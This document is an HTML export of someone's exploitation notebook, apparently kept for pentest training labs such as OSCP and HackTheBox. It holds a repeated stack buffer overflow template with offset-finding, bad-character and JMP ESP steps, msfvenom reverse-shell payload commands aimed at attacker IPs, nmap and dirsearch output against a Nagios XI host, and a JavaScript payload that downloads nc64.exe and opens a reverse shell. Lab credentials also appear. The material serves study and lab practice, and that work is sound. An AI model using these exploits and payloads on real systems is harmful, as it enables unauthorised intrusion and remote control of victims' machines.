25</h1><br/>b05edaf84c63c45c3d4a93c22ec4ecb4<br /><br />Bytes to break            = 3000<br />break Confirmed         = X<br />Exact Location            = 1377<br />overwrite confirmed    = X<br />Shellcode space          = 568<br />badchars                    = [0x00, 0x04, 0x47 0x4A]<br />opcode                       = FFE4<br />opcode hex                 = “\xFF\xE4\x90\x90”<br />operation address        = 56526683<br />little endian address    = \x83\x66\x52\x56<br /><br /><br /><br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br /><a href="http://www.whatasciicode.com/p/ascii-code-table.html">http://www.whatasciicode.com/p/ascii-code-table.html</a><br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br />#buffer = c + (&quot;A&quot; * (2288 - len(c))) + (&quot;B&quot; * 4) + (&quot;C&quot; * 1800)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    <br />buffer = (&quot;A&quot; * 2288) + &quot;\xcf\x10\x80\x14&quot; +  &quot;\xff\xE4\x90\x90&quot; + (&quot;\x90&quot; * 20) + payload + (&quot;\x90&quot; * 20)<br />    </div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/><a href=""><img src="images/1116-1.png" alt="images/1116-1.png" /></a><br /><br /><a href=""><img src="images/1116-2.png" alt="images/1116-2.png" /></a><br /><br /><a href=""><img src="images/1116-3.png" alt="images/1116-3.png" /></a><br /><br /><a href=""><img src="images/1116-4.png" alt="images/1116-4.png" /></a><br /><br /><a href=""><img src="images/1116-5.png" alt="images/1116-5.png" /></a><br /><br /><a href=""><img src="images/1116-6.png" alt="images/1116-6.png" /></a><br /><br /><a href=""><img src="images/1116-7.png" alt="images/1116-7.png" /></a><br /><br /><a href=""><img src="images/1116-8.png" alt="images/1116-8.png" /></a><br /><br /><a href=""><img src="images/1116-9.png" alt="images/1116-9.png" /></a><br /><br /><a href=""><img src="images/1116-10.png" alt="images/1116-10.png" /></a><br /><br /><a href=""><img src="images/1116-11.png" alt="images/1116-11.png" /></a><br /><br /><a href=""><img src="images/1116-12.png" alt="images/1116-12.png" /></a><br /><br /><a href=""><img src="images/1116-13.png" alt="images/1116-13.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>192.168.38.153</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>debian (ssh)<br /><br /><a href="https://github.com/jakgibb/nagiosxi-root-rce-exploit">https://github.com/jakgibb/nagiosxi-root-rce-exploit</a><br /><br /><a href="https://www.exploit-db.com/exploits/46221">https://www.exploit-db.com/exploits/46221</a><br /><br /><span style="color:#ff0000;">&lt;script type=&quot;text/javascript&quot;&gt;var Http = new XMLHttpRequest();var url=&#39;/admin/backdoorchecker.php&#39;; var params=&#39;cmd=dir| powershell -c &quot;iwr -uri http://10.10.14.10:8000/nc64.exe -outfile %temp%\a.exe&quot;;%temp%\a.exe -e cmd.exe 10.10.14.10 1111&#39;</span><br /><span style="color:#ff0000;">;Http.open(&quot;POST&quot;, url, true);Http.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);Http.send(params);&lt;/script&gt;</span></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 192.168.38.153 &amp;&amp; nmap -sC -sV -Pn 192.168.38.153 &amp;&amp; nmap -p- -Pn 192.168.38.153 &amp;&amp; nmap -Pn -p- -sU 192.168.38.153<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-19 16:55 EDT<br />Nmap scan report for 192.168.38.153<br />Host is up (0.017s latency).<br />Not shown: 996 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />80/tcp  open  http<br />389/tcp open  ldap<br />443/tcp open  https<br /><br />Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-19 16:55 EDT<br />Nmap scan report for 192.168.38.153<br />Host is up (0.014s latency).<br />Not shown: 996 closed ports<br />PORT    STATE SERVICE  VERSION<br />22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 d1:97:59:cf:b3:21:44:10:81:6a:33:29:eb:b6:b4:ae (RSA)<br />|   256 bc:56:85:87:a7:81:e4:bf:49:e3:18:de:c1:f7:1b:a6 (ECDSA)<br />|_  256 db:5a:18:1f:57:1c:8b:64:0f:a5:82:2a:61:f6:7e:e6 (ED25519)<br />80/tcp  open  http     Apache httpd 2.4.25 ((Debian))<br />|_http-server-header: Apache/2.4.25 (Debian)<br />|_http-title: Nagios XI<br />389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X<br />443/tcp open  ssl/http Apache httpd 2.4.25 ((Debian))<br />|_http-server-header: Apache/2.4.25 (Debian)<br />|_http-title: Nagios XI<br />| ssl-cert: Subject: commonName=10.60.60.216/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US<br />| Not valid before: 2019-02-18T14:02:28<br />|_Not valid after:  2029-02-15T14:02:28<br />|_ssl-date: TLS randomness does not represent time<br />| tls-alpn: <br />|_  http/1.1<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-19 16:55 EDT<br />Nmap scan report for 192.168.38.153<br />Host is up (0.011s latency).<br />Not shown: 65530 closed ports<br />PORT     STATE SERVICE<br />22/tcp   open  ssh<br />80/tcp   open  http<br />389/tcp  open  ldap<br />443/tcp  open  https<br />5667/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 13.58 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br /></div><div class='page'><h1 class='title level-6'>web</h1><br/>ORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.4.25 ((Debian))<br />|_http-server-header: Apache/2.4.25 (Debian)<br /><br />PORT    STATE SERVICE  REASON  VERSION<br />443/tcp open  ssl/http syn-ack Apache httpd 2.4.25 ((Debian))<br />|_http-server-header: Apache/2.4.25 (Debian)</div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/> _|. _ _  _  _  _ _|_    v0.3.9<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php, html | HTTP method: get | Threads: 20 | Wordlist size: 262937 | Recursion level: 10<br /><br />Error Log: /Yeet/Tools/TireFire/dirsearch/logs/errors-20-05-19_17-22-57.log<br /><br />Target: http://192.168.38.153:80/nagiosxi<br /><br />[17:22:57] Starting: <br />[17:22:57] 403 -  302B  - /nagiosxi/.php<br />[17:22:57] 403 -  303B  - /nagiosxi/.html<br />[17:22:57] 302 -   27B  - /nagiosxi/index.php  -&gt;  http://192.168.38.153/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&amp;noauth=1<br />[17:22:57] 200 -   17KB - /nagiosxi/about/<br />[17:22:57] 200 -   25KB - /nagiosxi/login.php<br />[17:22:57] 302 -   27B  - /nagiosxi/help/  -&gt;  http://192.168.38.153/nagiosxi/login.php?redirect=/nagiosxi/help/index.php%3f&amp;noauth=1<br />[17:22:57] 302 -   27B  - /nagiosxi/tools/  -&gt;  http://192.168.38.153/nagiosxi/login.php?redirect=/nagiosxi/tools/index.php%3f&amp;noauth=1<br />[17:22:58] 302 -   27B  - /nagiosxi/admin/  -&gt;  http://192.168.38.153/nagiosxi/login.php?redirect=/nagiosxi/admin/index.php%3f&amp;noauth=1<br />[17:22:58] 302 -   27B  - /nagiosxi/reports/  -&gt;  http://192.168.38.153/nagiosxi/login.php?redirect=/nagiosxi/reports/index.php%3f&amp;noauth=1<br />[17:22:58] 302 -   27B  - /nagiosxi/account/  -&gt;  http://192.168.38.153/nagiosxi/login.php?redirect=/nagiosxi/account/index.php%3f&amp;noauth=1<br />[17:22:58] 403 -  305B  - /nagiosxi/images/<br />[17:22:59] 403 -  307B  - /nagiosxi/includes/<br />[17:23:00] 302 -    0B  - /nagiosxi/install.php  -&gt;  http://192.168.38.153/nagiosxi/<br />[17:23:00] 200 -  108B  - /nagiosxi/backend/<br />[17:23:00] 403 -  301B  - /nagiosxi/db/<br />[17:23:00] 403 -  302B  - /nagiosxi/api/<br />[17:23:01] 302 -    0B  - /nagiosxi/upgrade.php  -&gt;  index.php<br />[17:23:02] 302 -   27B  - /nagiosxi/config/  -&gt;  http://192.168.38.153/nagiosxi/login.php?redirect=/nagiosxi/config/index.php%3f&amp;noauth=1<br />[17:23:06] 200 -    0B  - /nagiosxi/suggest.php<br />[17:23:07] 302 -   27B  - /nagiosxi/views/  -&gt;  http://192.168.38.153/nagiosxi/login.php?redirect=/nagiosxi/views/index.php%3f&amp;noauth=1<br />[17:23:11] 302 -    0B  - /nagiosxi/rr.php  -&gt;  login.php<br />[17:27:22] Starting: about/<br />[17:27:22] 403 -  309B  - /nagiosxi/about/.html<br />[17:27:22] 403 -  308B  - /nagiosxi/about/.php<br />[17:27:22] 200 -   17KB - /nagiosxi/about/index.php<br />[17:27:22] 200 -   18KB - /nagiosxi/about/main.php<br />[17:31:48] Starting: images/<br />[17:31:48] 403 -  309B  - /nagiosxi/images/.php<br />[17:31:48] 403 -  310B  - /nagiosxi/images/.html<br />[17:31:55] 403 -  312B  - /nagiosxi/images/social/<br />[17:32:08] 403 -  312B  - /nagiosxi/images/locale/<br />[17:32:35] 403 -  314B  - /nagiosxi/images/renewals/<br />[17:36:13] Starting: includes/<br />[17:36:13] 403 -  312B  - /nagiosxi/includes/.html<br />[17:36:13] 403 -  311B  - /nagiosxi/includes/.php<br />[17:36:14] 403 -  311B  - /nagiosxi/includes/css/<br />[17:36:16] 403 -  310B  - /nagiosxi/includes/js/<br />[17:36:16] 403 -  318B  - /nagiosxi/includes/components/<br />[17:36:17] 403 -  312B  - /nagiosxi/includes/lang/<br />[17:36:22] 403 -  313B  - /nagiosxi/includes/fonts/<br />[17:40:41] Starting: backend/<br />[17:40:41] 403 -  311B  - /nagiosxi/backend/.html<br />[17:40:41] 403 -  310B  - /nagiosxi/backend/.php<br />[17:40:41] 200 -  108B  - /nagiosxi/backend/index.php<br />[17:40:43] 403 -  315B  - /nagiosxi/backend/includes/<br />[17:45:07] Starting: db/<br />[17:45:07] 403 -  306B  - /nagiosxi/db/.html<br />[17:45:07] 403 -  305B  - /nagiosxi/db/.php<br />[17:46:20] 403 -  307B  - /nagiosxi/db/adodb/<br />[17:49:34] Starting: api/<br />[17:49:34] 403 -  307B  - /nagiosxi/api/.html<br />[17:49:34] 403 -  306B  - /nagiosxi/api/.php<br />[17:49:36] 403 -  311B  - /nagiosxi/api/includes/<br />[17:49:41] 200 -   32B  - /nagiosxi/api/v1/<br />[17:50:21] 200 -   32B  - /nagiosxi/api/V1/<br />[17:54:14] Starting: images/social/<br />[17:54:14] 403 -  316B  - /nagiosxi/images/social/.php<br />[17:54:14] 403 -  317B  - /nagiosxi/images/social/.html<br />[17:58:50] Starting: images/locale/<br />[17:58:50] 403 -  317B  - /nagiosxi/images/locale/.html<br />[17:58:50] 403 -  316B  - /nagiosxi/images/locale/.php<br />[18:03:39] Starting: images/renewals/<br />[18:03:39] 403 -  318B  - /nagiosxi/images/renewals/.php<br />[18:03:39] 403 -  319B  - /nagiosxi/images/renewals/.html<br />[18:08:21] Starting: includes/css/<br />[18:08:22] 403 -  316B  - /nagiosxi/includes/css/.html<br />[18:08:22] 403 -  315B  - /nagiosxi/includes/css/.php<br />[18:08:22] 403 -  318B  - /nagiosxi/includes/css/themes/<br />[18:13:08] Starting: includes/js/<br />[18:13:08] 403 -  315B  - /nagiosxi/includes/js/.html<br />[18:13:08] 403 -  314B  - /nagiosxi/includes/js/.php<br />[18:13:08] 403 -  317B  - /nagiosxi/includes/js/themes/<br />[18:13:31] 403 -  313B  - /nagiosxi/includes/js/d3/<br />[18:16:55] 403 -  317B  - /nagiosxi/includes/js/jquery/<br />[18:17:51] Starting: includes/components/<br />[18:17:51] 403 -  322B  - /nagiosxi/includes/components/.php<br />[18:17:51] 403 -  323B  - /nagiosxi/includes/components/.html<br />[18:17:51] 403 -  326B  - /nagiosxi/includes/components/profile/<br />[18:17:55] 403 -  324B  - /nagiosxi/includes/components/proxy/<br />[18:18:02] 403 -  326B  - /nagiosxi/includes/components/actions/<br />[18:18:09] 403 -  327B  - /nagiosxi/includes/components/response/<br />[18:18:17] 200 -   27B  - /nagiosxi/includes/components/metrics/<br />[18:18:28] 403 -  325B  - /nagiosxi/includes/components/rename/<br />[18:18:41] 403 -  322B  - /nagiosxi/includes/components/pnp/<br />[18:18:45] 403 -  322B  - /nagiosxi/includes/components/mtr/<br />[18:19:05] 302 -   27B  - /nagiosxi/includes/components/ccm/  -&gt;  http://192.168.38.153/nagiosxi/login.php?redirect=/nagiosxi/includes/components/ccm/index.php%3f&amp;noauth=1<br />[18:20:20] 403 -  322B  - /nagiosxi/includes/components/rdp/<br />[18:21:25] 403 -  322B  - /nagiosxi/includes/components/duo/<br />[18:22:19] Starting: includes/lang/<br />[18:22:19] 403 -  316B  - /nagiosxi/includes/lang/.php<br />[18:22:19] 403 -  317B  - /nagiosxi/includes/lang/.html<br />[18:22:40] 403 -  319B  - /nagiosxi/includes/lang/locale/<br />[18:26:54] Starting: includes/fonts/<br />[18:26:54] 403 -  318B  - /nagiosxi/includes/fonts/.html<br />[18:26:54] 403 -  317B  - /nagiosxi/includes/fonts/.php<br />[18:31:21] Starting: backend/includes/<br />[18:31:21] 403 -  319B  - /nagiosxi/backend/includes/.php<br />[18:31:21] 403 -  320B  - /nagiosxi/backend/includes/.html<br />[18:35:56] Starting: db/adodb/<br />[18:35:56] 403 -  311B  - /nagiosxi/db/adodb/.php<br />[18:35:56] 403 -  312B  - /nagiosxi/db/adodb/.html<br />[18:35:56] 200 -   11KB - /nagiosxi/db/adodb/docs/<br />[18:35:57] 403 -  313B  - /nagiosxi/db/adodb/tests/<br />[18:35:57] 200 -   42B  - /nagiosxi/db/adodb/server.php<br />[18:35:59] 403 -  315B  - /nagiosxi/db/adodb/contrib/<br />[18:35:59] 403 -  312B  - /nagiosxi/db/adodb/lang/<br />[18:35:59] 403 -  315B  - /nagiosxi/db/adodb/drivers/<br />[18:36:19] 403 -  311B  - /nagiosxi/db/adodb/xsl/<br />[18:36:25] 403 -  315B  - /nagiosxi/db/adodb/session/<br />[18:36:35] 403 -  312B  - /nagiosxi/db/adodb/pear/<br />[18:36:35] 403 -  312B  - /nagiosxi/db/adodb/perf/<br />[18:40:26] Starting: api/includes/<br />[18:40:26] 403 -  315B  - /nagiosxi/api/includes/.php<br />[18:40:26] 403 -  316B  - /nagiosxi/api/includes/.html<br />[18:44:53] Starting: api/v1/<br />[18:47:13] 200 -   34B  - /nagiosxi/api/v1/license/<br />[19:02:29] 500 -    0B  - /nagiosxi/api/v1/uc.html<br />[19:45:38] 500 -    0B  - /nagiosxi/api/v1/3319/<br />[19:45:38] 500 -    0B  - /nagiosxi/api/v1/wpa.php<br /></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/></div><div class='page'><h1 class='title level-4'>Buff 10.10.10.198</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>possible domain name <br />   Projectworlds.in<br />   <br />users<br />    mrb3n<br />    Dr. Med. Kenneth H. Cooper<br />    Larous India<br />    gagen@gmail.com<br />    <br />passwords<br />    12345<br />    <br />gajenpradhan18@gmail.com<br />gajen123@gmail.com<br />admin@admin.com<br /><br /><br />$mysql_host = &quot;mysql16.000webhost.com&quot;;<br />$mysql_database = &quot;a8743500_secure&quot;;<br />$mysql_user = &quot;a8743500_secure&quot;;<br />$mysql_password = &quot;ipad12345&quot;;<br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>Nmap done: 1 IP address (1 host up) scanned in 42.86 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-07-31 18:38 EDT<br />Nmap scan report for 10.10.10.198<br />Host is up (0.23s latency).<br />Not shown: 999 filtered ports<br />PORT     STATE SERVICE VERSION<br />8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)<br />| http-open-proxy: Potentially OPEN proxy.<br />|_Methods supported:CONNECTION<br />|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6<br />|_http-title: mrb3n&#39;s Bro Hut<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 53.99 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-07-31 18:39 EDT<br />Nmap scan report for 10.10.10.198<br />Host is up (0.18s latency).<br />Not shown: 65533 filtered ports<br />PORT     STATE SERVICE<br />7680/tcp open  pando-pub<br />8080/tcp open  http-proxy<br /></div><div class='page'><h1 class='title level-3'>BO</h1><br/>Bytes to break            = <br />break Confirmed         = <br />Exact Location            = <br />overwrite confirmed    = <br />Shellcode space          = <br />badchars                    = <br />opcode                       = <br />opcode hex                 = <br />operation address        = <br />little endian address    = <br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br /><a href="http://www.whatasciicode.com/p/ascii-code-table.html">http://www.whatasciicode.com/p/ascii-code-table.html</a><br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br />#buffer = c + (&quot;A&quot; * (2288 - len(c))) + (&quot;B&quot; * 4) + (&quot;C&quot; * 1800)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b &#39;\x00\x0A\x0D\x25\x26\x2B\x3D&#39; -e x86/shikata_ga_nai<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b &#39;\x00\x0A\x0D\x25\x26\x2B\x3D&#39; -e x86/shikata_ga_nai exitfuc=thread<br />     msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b &quot;\x0 0\x20&quot; -f py -v shellcode <br />buffer = (&quot;A&quot; * 2288) + &quot;\xcf\x10\x80\x14&quot; +  &quot;\xff\xE4\x90\x90&quot; + (&quot;\x90&quot; * 20) + payload + (&quot;\x90&quot; * 20)<br />    </div><div class='page'><h1 class='title level-4'>VulnApp1</h1><br/>Bytes to break            = 2560<br />break Confirmed         = X<br />Exact Location            = 2288 + B<br />overwrite confirmed    = X<br />Shellcode space          = 1808<br />badchars                    = \x00<br />JMP ESP                      = 0x148010cf<br />little endian JMP ESP   = “\xcf\x10\x80\x14”<br /><br /><br /><br /><br /><br /><br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    <br />    <br />    <br />    <br />    </div><div class='page'><h1 class='title level-4'>VulnApp1.1</h1><br/>Bytes to break            = 2560<br />break Confirmed         = X<br />Exact Location            = 2288 <br />overwrite confirmed    = X<br />Shellcode space          = 1800<br />badchars                    = 0x00<br />JMP ESP                      = 148010cf<br />little endian JMP ESP   = cf108014<br /><br /><br /><br /><br /><br /><br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br />      <br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b \\x00 -e x86/alpha_upper &gt; payload.txt</div><div class='page'><h1 class='title level-4'>VulnApp1.2</h1><br/>Bytes to break            = 2560<br />break Confirmed         = X<br />Exact Location            = 2288<br />overwrite confirmed    = X<br />Shellcode space          = 1800<br />badchars                    = \x00<br />JMP ESP                      = 148010cf<br />little endian JMP ESP    = &quot;\xcf\x10\x80\x14&quot;<br /><br /><br /><br /><br /><br /><br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x3b&quot; -e x86/alpha_upper &gt; payload.txt<br />    </div><div class='page'><h1 class='title level-4'>VulnApp1.3</h1><br/>Bytes to break            = 2560<br />break Confirmed         = x<br />Exact Location            = 2288<br />overwrite confirmed    = x<br />Shellcode space          = 1800<br />badchars                    = 0x00, 0x0a, 0x0d<br />opcode                       = FFE4<br />opcode hex                 = “\xFF\xE4\x00\x00”<br />operation address        = 148010cf<br />little endian address    = “\xcf\x10\x80\x14”<br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br /><a href="http://www.whatasciicode.com/p/ascii-code-table.html">http://www.whatasciicode.com/p/ascii-code-table.html</a><br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    <br />buffer = (&quot;A&quot; * 2288) + &quot;\xcf\x10\x80\x14&quot; +  &quot;\xff\xE4\x90\x90&quot; + (&quot;\x90&quot; * 20) + payload + (&quot;\x90&quot; * 20)</div><div class='page'><h1 class='title level-4'>VulnApp2</h1><br/>Bytes to break            = 2096<br />break Confirmed         = X<br />Exact Location            = 2080<br />overwrite confirmed    = X<br />Shellcode space          = tiny<br />badchars                    = <br />OPCODE                     = CALL ECX<br />OPCODE HEX              = \xFF\xD1<br />OPCODE LOCATION     = 1480113d<br />little endian opcode location   = \x3D\x11\x80\x14<br /><br /><br /><br /><br /><br /><br /><br /><br />Find Offset<br 